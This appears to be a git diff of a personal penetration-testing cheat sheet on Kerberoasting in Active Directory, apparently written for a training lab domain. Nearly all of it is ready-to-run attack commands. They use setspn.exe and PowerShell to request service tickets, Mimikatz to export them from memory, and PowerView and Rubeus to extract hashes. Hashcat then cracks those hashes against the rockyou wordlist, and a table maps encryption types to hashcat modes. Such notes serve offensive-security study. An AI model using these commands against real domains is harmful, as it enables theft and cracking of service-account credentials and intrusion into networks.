@@ -802,7 +802,8 @@ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
 ```
 ### from Windows
 
-#### Enumerating SPNs and request tickets with setspn.exe
+#### setspn.exe manual method 
+Enumerating SPNs and request tickets with setspn.exe
 
 ```powershell
 # Enumerating SPNs
@@ -816,8 +817,7 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
 ```
 
-#### Extracting Tickets from Memory with Mimikatz
-after requesting the tickets using `setspn.exe` now we need to extract it 
+Extracting Tickets from Memory with Mimikatz , after requesting the tickets using `setspn.exe` now we need to extract it 
 ``` powershell
 # extract tickets as .kirbi
 .\mimikatz.exe  "kerberos::list /export" "exit"
@@ -839,4 +839,52 @@ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_
 
 # Cracking the Hash with Hashcat
 hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
+```
+
+#### PowerView method 
+
+```powershell
+# Using PowerView to Extract TGS Tickets
+import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+
+# Using PowerView to Target a Specific User
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+
+# Exporting All Tickets to a CSV File
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+
+```
+
+#### Rubeus method 
+
+```powershell
+# Using the /stats Flag
+.\Rubeus.exe kerberoast /stats
+
+# Using the /nowrap Flag
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```
+
+### Encryption Types
+- check the [chart](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) to see every decmial value and the corresponding encryption type
+- check hashcat [hashs' id](https://hashcat.net/wiki/doku.php?id=example_hashes)
+```powershell
+# check encryption type
+Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+
+# get ticket (we can see the supported Encryption type also)
+.\Rubeus.exe kerberoast /user:testspn /nowrap
+```
+| Hash Prefix       | Encryption Type | Etype Number | Hashcat ID |
+|-------------------|-----------------|--------------|------------|
+| $krb5tgs$23$      | RC4-HMAC        | 23           | 13100      |
+| $krb5tgs$17$      | AES-128         | 17           | 19600      |
+| $krb5tgs$18$      | AES-256         | 18           | 19700      |
+
+
+```powershell 
+hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
+
+hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
 ```
